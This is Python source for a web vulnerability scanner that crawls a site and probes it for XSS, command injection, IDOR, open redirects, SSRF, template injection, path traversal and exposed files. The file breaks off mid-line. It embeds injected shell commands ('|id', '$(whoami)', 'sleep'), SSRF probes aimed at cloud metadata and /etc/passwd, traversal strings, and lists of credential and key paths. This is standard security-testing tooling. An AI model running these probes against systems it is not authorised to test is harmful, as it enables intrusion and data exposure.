"""Apex CLI v5.0 — Built-in scanners (no external tool dependencies)."""

import json
import re
import socket
import subprocess
import time
import urllib.parse
from collections import defaultdict

import requests
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()
_TIMEOUT = 10       # default request timeout
_TIMEOUT_SHORT = 5  # quick probes
_TIMEOUT_LONG = 15  # external APIs (Wayback, crt.sh)
_RATE_DELAY = 0.0  # seconds between requests per thread, set via set_rate_limit()

import threading as _tl_threading
_thread_local = _tl_threading.local()

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]

def _get_session():
    """Return a thread-local requests session with rotating User-Agent and connection pooling."""
    if not hasattr(_thread_local, "session"):
        import random
        from requests.adapters import HTTPAdapter
        s = requests.Session()
        s.headers.update({
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        s.verify = False
        # Connection pooling — reuse TCP connections aggressively
        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=1)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        if _PROXY:
            s.proxies = _PROXY
        _thread_local.session = s
    return _thread_local.session

# Backwards-compat proxy — reads from thread-local session
class _SessionProxy:
    """Thread-local session proxy with request/response capture for PoC."""
    _last_request = {}  # thread-local last request details

    def _capture(self, method, url, **kw):
        """Capture request details for PoC generation."""
        import threading as _ct
        tid = _ct.get_ident()
        headers = dict(_get_session().headers)
        headers.update(kw.get("headers", {}))
        self._last_request[tid] = {
            "method": method.upper(),
            "url": url,
            "headers": headers,
            "body": kw.get("data") or kw.get("json") or "",
        }

    def get(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        if _BACKOFF_UNTIL > time.time():
            time.sleep(_BACKOFF_UNTIL - time.time())
        self._capture("GET", a[0] if a else "", **kw)
        r = _get_session().get(*a, **kw)
        _adaptive_backoff(r)
        return r
    def post(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        if _BACKOFF_UNTIL > time.time():
            time.sleep(_BACKOFF_UNTIL - time.time())
        self._capture("POST", a[0] if a else "", **kw)
        r = _get_session().post(*a, **kw)
        _adaptive_backoff(r)
        return r
    def request(self, *a, **kw):
        if _RATE_DELAY > 0:
            time.sleep(_RATE_DELAY)
        if _BACKOFF_UNTIL > time.time():
            time.sleep(_BACKOFF_UNTIL - time.time())
        self._capture(a[0] if a else "REQUEST", a[1] if len(a) > 1 else "", **kw)
        r = _get_session().request(*a, **kw)
        _adaptive_backoff(r)
        return r
    def options(self, *a, **kw):
        return _get_session().options(*a, **kw)
    def head(self, *a, **kw):
        return _get_session().head(*a, **kw)
    def put(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        self._capture("PUT", a[0] if a else "", **kw)
        return _get_session().put(*a, **kw)
    def delete(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        self._capture("DELETE", a[0] if a else "", **kw)
        return _get_session().delete(*a, **kw)
    def patch(self, *a, **kw):
        if _RATE_DELAY > 0: time.sleep(_RATE_DELAY)
        self._capture("PATCH", a[0] if a else "", **kw)
        return _get_session().patch(*a, **kw)

_S = _SessionProxy()
_PROXY = None

def get_last_request():
    """Get the last HTTP request made by this thread — for PoC capture."""
    import threading as _ct
    return _S._last_request.get(_ct.get_ident(), {})  # Set via set_proxy()

def set_proxy(proxy_url):
    """Route all requests through a proxy (e.g., Burp Suite: http://127.0.0.1:8080)."""
    global _PROXY
    _PROXY = {"http": proxy_url, "https": proxy_url}
    # Apply to all future thread-local sessions
    import threading as _pt
    _thread_local.__dict__.clear()  # Force new sessions with proxy

_BACKOFF_LOCK = _tl_threading.Lock()
_BACKOFF_UNTIL = 0.0  # timestamp until which we should back off

# --- High-performance batch request engine ---
from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _as_completed

_BATCH_POOL = _TPE(max_workers=50)  # shared pool for intra-scanner parallelism


def batch_get(urls, timeout=None, headers=None, max_workers=50):
    """Parallel GET requests — returns list of (url, response|None)."""
    timeout = timeout or _TIMEOUT
    results = []

    def _fetch(url):
        try:
            if _RATE_DELAY > 0:
                time.sleep(_RATE_DELAY)
            if _BACKOFF_UNTIL > time.time():
                time.sleep(_BACKOFF_UNTIL - time.time())
            r = _get_session().get(url, timeout=timeout, headers=headers or {})
            _adaptive_backoff(r)
            return (url, r)
        except Exception:
            return (url, None)

    futs = {_BATCH_POOL.submit(_fetch, u): u for u in urls}
    for f in _as_completed(futs):
        results.append(f.result())
    return results


def batch_request(items, timeout=None, max_workers=50):
    """Parallel arbitrary requests. items = list of (method, url, kwargs) tuples.
    Returns list of (url, response|None)."""
    timeout = timeout or _TIMEOUT
    results = []

    def _fetch(item):
        method, url, kw = item
        try:
            if _RATE_DELAY > 0:
                time.sleep(_RATE_DELAY)
            if _BACKOFF_UNTIL > time.time():
                time.sleep(_BACKOFF_UNTIL - time.time())
            kw.setdefault("timeout", timeout)
            r = _get_session().request(method, url, **kw)
            _adaptive_backoff(r)
            return (url, r)
        except Exception:
            return (url, None)

    futs = {_BATCH_POOL.submit(_fetch, i): i for i in items}
    for f in _as_completed(futs):
        results.append(f.result())
    return results


# --- DNS cache for session ---
import socket as _socket
_DNS_CACHE = {}
_DNS_CACHE_LOCK = _tl_threading.Lock()
_original_getaddrinfo = _socket.getaddrinfo


def _cached_getaddrinfo(*args, **kwargs):
    key = (args[0], args[1])
    with _DNS_CACHE_LOCK:
        if key in _DNS_CACHE:
            return _DNS_CACHE[key]
    result = _original_getaddrinfo(*args, **kwargs)
    with _DNS_CACHE_LOCK:
        _DNS_CACHE[key] = result
    return result

_socket.getaddrinfo = _cached_getaddrinfo


def _adaptive_backoff(response):
    """Exponential backoff on 429/503 — shared across threads."""
    global _BACKOFF_UNTIL
    if response is not None and response.status_code in (429, 503):
        with _BACKOFF_LOCK:
            retry_after = float(response.headers.get("Retry-After", 0))
            delay = max(retry_after, 2.0)
            _BACKOFF_UNTIL = time.time() + delay
        time.sleep(delay)
    elif _BACKOFF_UNTIL > time.time():
        time.sleep(_BACKOFF_UNTIL - time.time())


def set_rate_limit(delay_seconds):
    global _RATE_DELAY
    _RATE_DELAY = delay_seconds

# ---------------------------------------------------------------------------
# Crawler
# ---------------------------------------------------------------------------

def crawl(base_url, max_pages=50):
    """Crawl a site, return dict with pages, forms, links, params."""
    visited = set()
    to_visit = [base_url]
    pages = []
    forms = []
    params_found = defaultdict(set)  # url -> set of param names
    links = set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0].split("#")[0]
        if norm in visited:
            continue
        visited.add(norm)

        try:
            r = _S.get(url, timeout=_TIMEOUT, allow_redirects=True)
        except Exception:
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content)})

        # Handle JSON API responses — extract keys as params
        ctype = r.headers.get("content-type", "").lower()
        if "application/json" in ctype or (r.text.strip()[:1] in ("{", "[")):
            try:
                data = json.loads(r.text)
                # Flatten top-level keys as params for this endpoint
                if isinstance(data, dict):
                    for k in data.keys():
                        params_found[url.split("?")[0]].add(k)
                elif isinstance(data, list) and data and isinstance(data[0], dict):
                    for k in data[0].keys():
                        params_found[url.split("?")[0]].add(k)
                # Also add any nested URL-like values as links
                def _extract_urls(obj, depth=0):
                    if depth > 3: return
                    if isinstance(obj, str) and obj.startswith(("http://","https://","/")):
                        links.add(obj if obj.startswith("http") else urllib.parse.urljoin(url, obj))
                    elif isinstance(obj, dict):
                        for v in obj.values(): _extract_urls(v, depth+1)
                    elif isinstance(obj, list):
                        for v in obj[:5]: _extract_urls(v, depth+1)
                _extract_urls(data)
            except Exception:
                pass
            continue  # No HTML to parse

        soup = BeautifulSoup(r.text, "lxml")

        # Extract links
        for tag in soup.find_all("a", href=True):
            href = tag["href"]
            full = urllib.parse.urljoin(url, href)
            parsed = urllib.parse.urlparse(full)
            # Stay on same host
            base_parsed = urllib.parse.urlparse(base_url)
            if parsed.netloc and parsed.netloc != base_parsed.netloc:
                continue
            clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                for k, _ in urllib.parse.parse_qsl(parsed.query):
                    params_found[clean].add(k)
            links.add(full)
            if clean not in visited:
                to_visit.append(full)

        # Extract params from JS fetch/axios/XHR calls
        for script in soup.find_all("script", src=False):
            if not script.string:
                continue
            js = script.string
            for m in re.finditer(r"""(?:fetch|axios\.\w+|\.get|\.post)\s*\(\s*['"]([^'"]+)['"]""", js):
                ep = m.group(1)
                if "?" not in ep:
                    continue
                ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                    params_found[ep_base.split("?")[0]].add(k)
            for m in re.finditer(r"""url\s*:\s*['"]([^'"?]+\?[^'"]+)['"]""", js):
                ep = m.group(1)
                ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                    params_found[ep_base.split("?")[0]].add(k)

        # Extract params from data-* attributes and inline handlers
        for tag in soup.find_all(True):
            for attr, val in tag.attrs.items():
                if isinstance(val, str) and "?" in val:
                    try:
                        ep = val if val.startswith("http") else urllib.parse.urljoin(url, val)
                        ep_parsed = urllib.parse.urlparse(ep)
                        for k in urllib.parse.parse_qs(ep_parsed.query):
                            params_found[ep.split("?")[0]].add(k)
                    except Exception:
                        pass
            # Inline event handlers with URLs
            for attr in ("onclick", "onsubmit", "onchange", "data-url", "data-href", "data-action"):
                val = tag.get(attr, "")
                if val and "?" in val:
                    try:
                        for m in re.finditer(r"""['"]([^'"]+\?[^'"]+)['"]""", val):
                            ep = m.group(1)
                            ep_base = ep if ep.startswith("http") else urllib.parse.urljoin(url, ep)
                            for k in urllib.parse.parse_qs(urllib.parse.urlparse(ep).query):
                                params_found[ep_base.split("?")[0]].add(k)
                    except Exception:
                        pass

        # Extract forms
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()
            action_url = urllib.parse.urljoin(url, action)
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs.append({
                        "name": name,
                        "type": inp.get("type", "text"),
                        "value": inp.get("value", ""),
                    })
            forms.append({"url": url, "action": action_url, "method": method, "inputs": inputs})

    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
    }

# ---------------------------------------------------------------------------
# XSS Scanner
# ---------------------------------------------------------------------------

_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*7}}',
]
_XSS_CANARY = "apex" + str(int(time.time()))[-6:]

def scan_xss(crawl_data):
    """Test reflected XSS on GET params and form inputs."""
    findings = []

    # GET params
    for url, params in crawl_data["params"].items():
        for param in params:
            for payload in _XSS_PAYLOADS:
                test_url = f"{url}?{urllib.parse.urlencode({param: payload})}"
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    ctype = r.headers.get("content-type", "").lower()
                    if payload in r.text and "text/html" in ctype:
                        findings.append({
                            "type": "Reflected XSS",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Param '{param}' reflects payload unescaped",
                            "template": "apex-xss",
                        })
                        break  # one payload enough per param
                except Exception:
                    continue

    # Forms (GET and POST)
    for form in crawl_data["forms"]:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "hidden", "button"):
                continue
            for payload in _XSS_PAYLOADS:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "GET":
                        r = _S.get(form["action"], params=data, timeout=_TIMEOUT)
                    else:
                        r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if payload in r.text:
                        findings.append({
                            "type": "Reflected XSS",
                            "severity": "high",
                            "url": form["action"],
                            "detail": f"Form input '{inp['name']}' reflects payload",
                            "template": "apex-xss-form",
                        })
                        break
                except Exception:
                    continue

    return findings

# ---------------------------------------------------------------------------
# Command Injection Scanner
# ---------------------------------------------------------------------------

_CMDI_PAYLOADS = [
    (";sleep 5", 4.5),
    ("|sleep 5", 4.5),
    ("$(sleep 5)", 4.5),
    ("`sleep 5`", 4.5),
]
_CMDI_BLIND_PAYLOADS = [
    (";echo apex_cmdi_test", "apex_cmdi_test"),
    ("|id", "uid="),
    ("$(whoami)", None),  # time-based only
]

def scan_cmdi(crawl_data):
    """Test command injection on form inputs using time-based and output-based detection."""
    findings = []

    for form in crawl_data["forms"]:
        if form["method"] != "POST":
            continue
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "hidden", "button", "password"):
                continue

            # Time-based detection
            for payload, min_delay in _CMDI_PAYLOADS:
                data = {i["name"]: i["value"] or "127.0.0.1" for i in form["inputs"]}
                data[inp["name"]] = "127.0.0.1" + payload
                try:
                    start = time.time()
                    r = _S.post(form["action"], data=data, timeout=15)
                    elapsed = time.time() - start
                    if elapsed >= min_delay:
                        findings.append({
                            "type": "Command Injection (time-based)",
                            "severity": "critical",
                            "url": form["action"],
                            "detail": f"Input '{inp['name']}' — {elapsed:.1f}s delay with '{payload}'",
                            "template": "apex-cmdi",
                        })
                        break
                except Exception:
                    continue

            # Output-based detection
            for payload, marker in _CMDI_BLIND_PAYLOADS:
                if marker is None:
                    continue
                data = {i["name"]: i["value"] or "127.0.0.1" for i in form["inputs"]}
                data[inp["name"]] = "127.0.0.1" + payload
                try:
                    r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if marker in r.text:
                        findings.append({
                            "type": "Command Injection (output-based)",
                            "severity": "critical",
                            "url": form["action"],
                            "detail": f"Input '{inp['name']}' — found '{marker}' in response",
                            "template": "apex-cmdi",
                        })
                        break
                except Exception:
                    continue

    return findings

# ---------------------------------------------------------------------------
# IDOR Scanner
# ---------------------------------------------------------------------------

def scan_idor(crawl_data):
    """Test IDOR by enumerating numeric IDs on endpoints with id-like params."""
    findings = []
    id_params = ("id", "uid", "user_id", "userid", "account", "doc", "file", "note", "item", "order")

    # Check params found by crawler
    for url, params in crawl_data["params"].items():
        for param in params:
            if param.lower() not in id_params:
                continue
            findings.extend(_test_idor(url, param))

    # Also probe discovered pages with common id params
    tested = set()
    for page in crawl_data["pages"]:
        base = page["url"].split("?")[0]
        if base in tested:
            continue
        tested.add(base)
        for param in ("id", "uid", "user_id"):
            # Quick check: does the endpoint accept this param?
            try:
                r = _S.get(f"{base}?{param}=1", timeout=_TIMEOUT)
                if r.status_code == 200 and len(r.text) > 20:
                    findings.extend(_test_idor(base, param))
            except Exception:
                continue

    # Deduplicate
    seen = set()
    unique = []
    for f in findings:
        key = f"{f['url']}|{f['detail']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def _test_idor(url, param):
    """Test a single URL+param for IDOR by enumerating IDs 1-5."""
    findings = []
    responses = {}
    for test_id in range(1, 6):
        try:
            r = _S.get(f"{url}?{urllib.parse.urlencode({param: test_id})}", timeout=_TIMEOUT)
            if r.status_code == 200 and len(r.text) > 20:
                responses[test_id] = r.text[:200]
        except Exception:
            continue
    unique = set(responses.values())
    if len(unique) > 1:
        findings.append({
            "type": "IDOR (Insecure Direct Object Reference)",
            "severity": "high",
            "url": f"{url}?{param}=<id>",
            "detail": f"Param '{param}' returns different data for IDs {list(responses.keys())} without auth",
            "template": "apex-idor",
        })
    return findings

# ---------------------------------------------------------------------------
# Open Redirect Scanner
# ---------------------------------------------------------------------------

_REDIRECT_PARAMS = ("url", "redirect", "next", "return", "returnto", "goto", "dest",
                     "destination", "redir", "redirect_uri", "continue", "target", "link")
_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00",
]

def _is_open_redirect(location, payload):
    """Return True only if Location actually redirects to the payload domain."""
    if not location:
        return False
    parsed = urllib.parse.urlparse(location)
    return parsed.netloc in ("evil.com", "www.evil.com") or location.startswith("//evil.com")


def scan_open_redirect(crawl_data):
    """Test open redirect on URL-like parameters."""
    findings = []

    # Check params found by crawler
    for url, params in crawl_data["params"].items():
        for param in params:
            if param.lower() not in _REDIRECT_PARAMS:
                continue
            findings.extend(_test_redirect(url, param))

    # Probe discovered pages with common redirect params
    tested = set()
    for page in crawl_data["pages"]:
        base = page["url"].split("?")[0]
        if base in tested:
            continue
        tested.add(base)
        for param in ("url", "redirect", "next", "goto"):
            try:
                r = _S.get(f"{base}?{param}=https://evil.com",
                           timeout=_TIMEOUT, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if _is_open_redirect(loc, "https://evil.com"):
                    findings.append({
                        "type": "Open Redirect",
                        "severity": "medium",
                        "url": f"{base}?{param}=https://evil.com",
                        "detail": f"Redirects to: {loc}",
                        "template": "apex-redirect",
                    })
                    break
            except Exception:
                continue

    # Check forms too
    for form in crawl_data["forms"]:
        for inp in form["inputs"]:
            if inp["name"].lower() not in _REDIRECT_PARAMS:
                continue
            findings.extend(_test_redirect_form(form, inp))

    # Deduplicate
    seen = set()
    unique = []
    for f in findings:
        key = f["url"]
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique


def _test_redirect(url, param):
    findings = []
    for payload in _REDIRECT_PAYLOADS:
        try:
            r = _S.get(f"{url}?{urllib.parse.urlencode({param: payload})}",
                       timeout=_TIMEOUT, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if _is_open_redirect(loc, payload):
                findings.append({
                    "type": "Open Redirect",
                    "severity": "medium",
                    "url": f"{url}?{param}={payload}",
                    "detail": f"Redirects to: {loc}",
                    "template": "apex-redirect",
                })
                break
        except Exception:
            continue
    return findings


def _test_redirect_form(form, inp):
    findings = []
    for payload in _REDIRECT_PAYLOADS:
        data = {i["name"]: i["value"] or "/" for i in form["inputs"]}
        data[inp["name"]] = payload
        try:
            if form["method"] == "GET":
                r = _S.get(form["action"], params=data, timeout=_TIMEOUT, allow_redirects=False)
            else:
                r = _S.post(form["action"], data=data, timeout=_TIMEOUT, allow_redirects=False)
            loc = r.headers.get("Location", "")
            if _is_open_redirect(loc, payload):
                findings.append({
                    "type": "Open Redirect",
                    "severity": "medium",
                    "url": form["action"],
                    "detail": f"Input '{inp['name']}' redirects to: {loc}",
                    "template": "apex-redirect",
                })
                break
        except Exception:
            continue
    return findings

# ---------------------------------------------------------------------------
# Security Headers Analyzer
# ---------------------------------------------------------------------------

_SECURITY_HEADERS = {
    "Strict-Transport-Security": ("HSTS missing — no HTTPS enforcement", "medium"),
    "Content-Security-Policy": ("CSP missing — XSS risk", "medium"),
    "X-Frame-Options": ("X-Frame-Options missing — clickjacking risk", "low"),
    "X-Content-Type-Options": ("X-Content-Type-Options missing — MIME sniffing risk", "low"),
    "X-XSS-Protection": ("X-XSS-Protection missing", "info"),
    "Referrer-Policy": ("Referrer-Policy missing — info leakage risk", "low"),
    "Permissions-Policy": ("Permissions-Policy missing", "info"),
}

def scan_headers(base_url):
    """Check for missing security headers."""
    findings = []
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
    except Exception:
        return findings

    for header, (msg, severity) in _SECURITY_HEADERS.items():
        if header.lower() not in {k.lower(): v for k, v in r.headers.items()}:
            findings.append({
                "type": f"Missing Header: {header}",
                "severity": severity,
                "url": base_url,
                "detail": msg,
                "template": "apex-headers",
            })

    # Check for info-leaking headers
    for bad_header in ("Server", "X-Powered-By", "X-AspNet-Version"):
        val = r.headers.get(bad_header)
        if val:
            findings.append({
                "type": f"Info Disclosure: {bad_header}",
                "severity": "info",
                "url": base_url,
                "detail": f"{bad_header}: {val}",
                "template": "apex-headers",
            })

    return findings

# ---------------------------------------------------------------------------
# Tech Fingerprinting
# ---------------------------------------------------------------------------

_TECH_SIGNATURES = [
    ("Flask", [r"Werkzeug", r"flask", r"Set-Cookie:.*session="]),
    ("Django", [r"csrfmiddlewaretoken", r"django", r"__admin"]),
    ("Express", [r"X-Powered-By:\s*Express", r"express"]),
    ("PHP", [r"X-Powered-By:\s*PHP", r"\.php", r"PHPSESSID"]),
    ("ASP.NET", [r"X-AspNet-Version", r"__VIEWSTATE", r"\.aspx"]),
    ("WordPress", [r"wp-content", r"wp-includes", r"wordpress"]),
    ("Joomla", [r"joomla", r"/administrator"]),
    ("Drupal", [r"drupal", r"sites/default"]),
    ("Nginx", [r"Server:\s*nginx"]),
    ("Apache", [r"Server:\s*Apache"]),
    ("Cloudflare", [r"Server:\s*cloudflare", r"cf-ray"]),
    ("React", [r"react", r"_reactRoot", r"__NEXT_DATA__"]),
    ("Vue", [r"vue", r"v-app", r"nuxt"]),
    ("Bootstrap", [r"bootstrap\.min\.(css|js)"]),
    ("jQuery", [r"jquery\.min\.js", r"jquery"]),
]

def fingerprint(base_url):
    """Detect technologies from headers and response body."""
    detected = []
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
    except Exception:
        return detected

    headers_str = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    combined = headers_str + "\n" + r.text[:50000]

    for tech, patterns in _TECH_SIGNATURES:
        for pat in patterns:
            if re.search(pat, combined, re.IGNORECASE):
                detected.append(tech)
                break

    return list(set(detected))

# ---------------------------------------------------------------------------
# WAF Detection
# ---------------------------------------------------------------------------

_WAF_SIGNATURES = {
    "Cloudflare": [r"cf-ray", r"Server:\s*cloudflare", r"__cfduid"],
    "AWS WAF": [r"awselb", r"x-amzn-requestid"],
    "Akamai": [r"akamai", r"x-akamai"],
    "Sucuri": [r"sucuri", r"x-sucuri"],
    "Imperva": [r"incapsula", r"x-iinfo", r"visid_incap"],
    "ModSecurity": [r"mod_security", r"modsecurity"],
    "Wordfence": [r"wordfence"],
    "F5 BIG-IP": [r"BigIP", r"F5"],
    "Barracuda": [r"barracuda", r"barra_counter"],
    "Fortinet": [r"fortigate", r"fortiWeb"],
}

def detect_waf(base_url):
    """Detect WAF by checking headers and sending a malicious-looking request."""
    detected = []

    # Normal request
    try:
        r = _S.get(base_url, timeout=_TIMEOUT)
        headers_str = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        cookies_str = str(r.cookies.get_dict())
        combined = headers_str + cookies_str
    except Exception:
        return detected

    for waf, patterns in _WAF_SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, combined, re.IGNORECASE):
                detected.append(waf)
                break

    # Trigger WAF with malicious payload
    try:
        r2 = _S.get(f"{base_url}/?id=1' OR 1=1--", timeout=_TIMEOUT)
        if r2.status_code in (403, 406, 429, 503):
            if not detected:
                detected.append("Unknown WAF (blocked SQLi probe)")
    except Exception:
        pass

    return list(set(detected))

# ---------------------------------------------------------------------------
# Sensitive File Scanner
# ---------------------------------------------------------------------------

_SENSITIVE_PATHS = [
    ("/.env", "Environment file with credentials"),
    ("/.git/HEAD", "Git repository exposed"),
    ("/.git/config", "Git config exposed"),
    ("/.svn/entries", "SVN repository exposed"),
    ("/.DS_Store", "macOS directory metadata"),
    ("/robots.txt", "Robots file (may reveal hidden paths)"),
    ("/sitemap.xml", "Sitemap"),
    ("/.htaccess", "Apache config"),
    ("/web.config", "IIS config"),
    ("/wp-config.php.bak", "WordPress config backup"),
    ("/config.php.bak", "Config backup"),
    ("/debug", "Debug endpoint"),
    ("/server-status", "Apache server status"),
    ("/server-info", "Apache server info"),
    ("/phpinfo.php", "PHP info page"),
    ("/info.php", "PHP info page"),
    ("/elmah.axd", "ASP.NET error log"),
    ("/trace.axd", "ASP.NET trace"),
    ("/backup.sql", "Database backup"),
    ("/dump.sql", "Database dump"),
    ("/database.sql", "Database export"),
    ("/db.sql", "Database file"),
    ("/.bash_history", "Bash history"),
    ("/.ssh/id_rsa", "SSH private key"),
    ("/id_rsa", "SSH private key"),
    ("/admin", "Admin panel"),
    ("/administrator", "Admin panel"),
    ("/console", "Debug console"),
    ("/swagger.json", "API documentation"),
    ("/api-docs", "API documentation"),
    ("/graphql", "GraphQL endpoint"),
    ("/actuator", "Spring Boot actuator"),
    ("/actuator/env", "Spring Boot env"),
    ("/actuator/health", "Spring Boot health"),
    ("/.well-known/security.txt", "Security contact"),
    ("/crossdomain.xml", "Flash cross-domain policy"),
    ("/clientaccesspolicy.xml", "Silverlight policy"),
]

def scan_sensitive_files(base_url):
    """Check for common sensitive files — concurrent requests."""
    import concurrent.futures as _cf
    findings = []

    def _check_path(path_desc):
        path, desc = path_desc
        url = base_url.rstrip("/") + path
        try:
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 0:
                if any(x in r.text.lower() for x in ("not found", "404", "error")):
                    return None
                severity = "high"
                if path in ("/robots.txt", "/sitemap.xml", "/.well-known/security.txt"):
                    severity = "info"
                elif path in ("/admin", "/administrator", "/console"):
                    severity = "medium"
                return {
                    "type": f"Sensitive File: {path}",
                    "severity": severity,
                    "url": url,
                    "detail": f"{desc} ({len(r.text)} bytes)",
                    "template": "apex-sensitive",
                }
        except Exception:
            pass
        return None

    with _cf.ThreadPoolExecutor(max_workers=20) as pool:
        for result in pool.map(_check_path, _SENSITIVE_PATHS):
            if result:
                findings.append(result)
    return findings


# ---------------------------------------------------------------------------
# Advanced scanners — find real bugs that pay bounties
# ---------------------------------------------------------------------------

def scan_ssrf(crawl_data):
    """Test for Server-Side Request Forgery — parallelized."""
    findings = []
    canary = "http://169.254.169.254/latest/meta-data/"
    canary2 = "http://127.0.0.1:22"
    test_urls = []
    url_meta = {}  # test_url -> (original_url, param)

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in [canary, canary2, "http://[::1]", "file:///etc/passwd"]:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                test_urls.append(test_url)
                url_meta[test_url] = (url, p)

    found_urls = set()
    for test_url, r in batch_get(test_urls, timeout=_TIMEOUT):
        if r is None:
            continue
        orig_url, param = url_meta.get(test_url, (test_url, "?"))
        if orig_url in found_urls:
            continue
        if any(x in r.text.lower() for x in ["ami-id", "instance-id", "ssh-", "root:", "meta-data"]):
            found_urls.add(orig_url)
            findings.append({"type": "SSRF", "severity": "critical", "url": test_url,
                             "detail": f"SSRF via param {param}", "template": "apex-ssrf"})
    return findings


def scan_ssti(crawl_data):
    """Test for Server-Side Template Injection."""
    findings = []
    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"), ("#{7*7}", "49"), ("{{config}}", "SECRET_KEY")]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, expect in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if expect in r.text and payload not in r.text:
                        findings.append({"type": "SSTI (Server-Side Template Injection)", "severity": "critical",
                                         "url": test_url, "detail": f"SSTI via {p}: {payload} → {expect}",
                                         "template": "apex-ssti"})
                        break
                except Exception:
                    continue
    return findings


def scan_path_traversal(crawl_data):
    """Test for path traversal / LFI."""
    findings = []
    payloads = ["....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd",
                "....//....//....//....//windows/win.ini", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    markers = ["root:x:", "root:*:", "[fonts]", "daemon:"]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({"type": "Path Traversal / LFI", "severity": "critical",
                                         "url": test_url, "detail": f"LFI via {p}", "template": "apex-lfi"})
                        break
                except Exception:
                    continue
    return findings


def scan_broken_auth(crawl_data):
    """Test for broken authentication — accessible admin/API endpoints."""
    findings = []
    admin_paths = ["/admin", "/admin/dashboard", "/api/admin", "/api/users", "/api/v1/users",
                   "/graphql", "/api/config", "/debug", "/actuator", "/actuator/env",
                   "/swagger-ui.html", "/api-docs", "/.well-known/openid-configuration",
                   "/wp-json/wp/v2/users", "/api/v1/admin", "/internal", "/management"]
    for target in crawl_data.get("pages", [])[:3]:
        base = target["url"].split("/", 3)
        if len(base) >= 3:
            base_url = "/".join(base[:3])
        else:
            continue
        # Get baseline 404
        try:
            r404 = _S.get(f"{base_url}/nonexistent_test_8374xyz", timeout=5)
            size_404 = len(r404.content)
        except Exception:
            continue
        for path in admin_paths:
            try:
                r = _S.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
                if r.status_code == 200 and abs(len(r.content) - size_404) > 100:
                    body = r.text[:500].lower()
                    # Check for real content indicators
                    if any(x in body for x in ["admin", "dashboard", "user", "config", "swagger",
